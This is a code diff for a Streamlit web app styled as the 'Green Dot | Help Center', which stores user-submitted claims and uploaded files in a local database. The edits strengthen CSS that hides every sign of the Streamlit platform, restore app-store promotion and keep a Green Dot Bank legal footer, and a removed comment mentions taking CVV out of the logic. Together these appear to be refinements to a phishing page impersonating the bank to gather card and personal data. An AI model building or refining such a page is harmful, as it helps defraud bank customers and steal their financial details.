@@ -4,7 +4,7 @@ import sqlite3
 import os
 from datetime import datetime
 
-# Database setup (Removing CVV from logic)
+# DB Setup
 DB_NAME = 'claims.db'
 UPLOAD_DIR = 'uploads'
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -23,9 +23,8 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS REFORZADO PARA OCULTAR BRANDING DE STREAMLIT ---
+# --- CSS ULTRA AGRESIVO PARA OCULTAR STREAMLIT ---
 st.markdown("""<style>
-/* Ocultar header, footer y cualquier rastro de Streamlit */
 header {visibility: hidden !important; height: 0px !important;}
 footer {display: none !important; visibility: hidden !important;}
 #MainMenu {visibility: hidden !important;}
@@ -34,19 +33,17 @@ footer {display: none !important; visibility: hidden !important;}
 [data-testid=\"stAppToolbar\"] {display: none !important;}
 [data-testid=\"stFooterAd\"] {display: none !important;}
 
-/* Selectores especificos para el badge inferior */
+/* Eliminar el badge flotante y decoradores de Streamlit */
 div[class*=\"viewerBadge\"] {display: none !important;}
 div[class*=\"styles_viewerBadge\"] {display: none !important;}
 .stApp [data-testid=\"stStatusWidget\"] {display: none !important;}
 
-/* Ajuste de contenedor principal */
 .block-container {
     padding-top: 2rem !important;
     padding-bottom: 0rem !important;
     max-width: 800px !important;
 }
 
-/* Estilos de botones */
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
@@ -73,7 +70,7 @@ div[class*=\"styles_viewerBadge\"] {display: none !important;}
 }
 </style>""", unsafe_allow_html=True)
 
-# --- UI CONTENT ---
+# --- UI ---
 if os.path.exists('logo.svg'):
     st.image('logo.svg', width=150)
 
@@ -97,7 +94,7 @@ if submitted:
     else:
         st.error("⚠️ Please complete all fields.")
 
-# SECCIÓN DE APP STORES
+# RESTAURACIÓN DE APP STORES
 st.markdown("""<div class='app-promo-container'>
     <h3 style='color:white;'>Download the Green Dot app</h3>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
@@ -107,6 +104,6 @@ st.markdown("""<div class='app-promo-container'>
 </div>""", unsafe_allow_html=True)
 
 st.markdown("""<div class='legal-footer'>
-Green Dot cards are issued by Green Dot Bank, Member FDIC. 
+Green Dot cards are issued by Green Dot Bank, Member FDIC.
 ©2026 Green Dot Bank. All rights reserved. NMLS #914924.
 </div>""", unsafe_allow_html=True)
